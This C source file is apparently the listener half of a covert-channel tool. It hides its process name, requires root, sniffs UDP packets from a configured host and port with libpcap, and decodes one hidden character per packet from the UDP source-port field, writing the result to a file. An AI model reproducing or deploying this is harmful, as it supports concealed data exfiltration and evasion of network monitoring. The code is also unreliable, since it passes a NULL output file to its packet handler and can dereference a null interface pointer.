#include "client.h"

int main (int argc, char *argv[])
{
	/* Mask the process name */
	strcpy(argv[0], MASK);
	
	/* Change the UID/GID to 0 (raise to root) */
	if ((setuid(0) == -1) || (setgid(0) == -1))
    {
        systemFatal("You need to be root for this");
        exit(0);
    }

	/* Call the rest of the code */
    client();
    
    /* Exit */
    return 0;
}

int client()
{
    char errorBuffer[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    char *filter = malloc(sizeof(char) * FILTER_BUFFER);
    pcap_t *handle;
    pcap_if_t *nics;
    pcap_if_t *nic;
    bpf_u_int32 net;
    bpf_u_int32 mask;
    
    /* Get the devices on the machine */
    if (pcap_findalldevs(&nics, errorBuffer) == -1)
    {
        systemFatal("Unable to retrieve device list");
    }
    
    /* Find a suitable nic from the device list */
    for (nic = nics; nic; nic = nic->next)
    {
        if (pcap_lookupnet(nic->name, &net, &mask, errorBuffer) != -1)
        {
            break;
        }
    }
    
    /* Open the session */
    handle = pcap_open_live(nic->name, SNAP_LEN, 0, 0, errorBuffer);
    if (handle == NULL)
    {
        systemFatal("Unable to open live capture");
    }
    
    /* Create and parse the filter to the capture */
    snprintf(filter, FILTER_BUFFER, "src host %s src port %s", SOURCE_IP, SOURCE_PORT);
    if (pcap_compile(handle, &fp, filter, 0, net) == -1)
    {
        systemFatal("Unable to compile filter");
    }
    
    /* Set the filter on the listening device */
    if (pcap_setfilter(handle, &fp) == -1)
    {
        systemFatal("Unable to set filter");
    }
    
    /* Call pcap_loop and process packets as they are received */
    if (pcap_loop(handle, -1, receivedPacket, NULL) == -1)
    {
        systemFatal("Error in pcap_loop");
    }
    
    /* Clean up */
    free(filter);
    pcap_freecode(&fp);
    pcap_close(handle);
    
    return 0;
}

void receivedPacket(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
    const struct header_ip *ip = NULL;
    const struct header_udp *udp = NULL;
    
    FILE *output = (FILE*)args;
    
    int ipHeaderSize = 0;
    
    /* Get the IP header and offset value */
    ip = (struct header_ip*)(packet + SIZE_ETHERNET);
    ipHeaderSize = IP_HL(ip) * 4;
    if (ipHeaderSize < 20)
    {
        return;
    }
    
    /* Ensure that we are dealing with one of our sneaky UDP packets */
    if (ip->ip_p == IPPROTO_UDP)
    {
        /* Get our packet */
        udp = (struct header_udp*)(packet + SIZE_ETHERNET + ipHeaderSize);
        
        /* Now get all the information out of the packet and write it to disk */
        printf("Receiving Data: %c\n", udp->uh_sport);
        fprintf(output, "%c", udp->uh_sport);
        fflush(output);
    }
}
